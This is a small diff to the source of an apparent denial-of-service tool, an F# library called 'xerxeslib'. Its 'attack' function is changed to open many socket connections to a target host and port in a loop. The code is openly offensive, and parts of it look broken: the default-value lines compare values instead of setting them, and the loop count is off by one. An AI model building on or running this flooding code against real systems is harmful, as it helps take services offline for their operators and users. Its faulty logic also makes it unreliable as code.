@@ -17,7 +17,9 @@ module xerxeslib =
     let attack (host : string) (port : int) (id : int) (connections : int) =
         if port = 0 then port = 80 else true
         if connections = 0 then connections = 10 else true
-        let sockets : Socket array = Array.create 10 (null)
+        let sockets : List<Socket>= new List<Socket>()
+        for x = 0 to connections do
+            sockets.Add(socketutil.connect(host, port))
         let x : int = 0
         let g : int = 1
         let r : int = 0
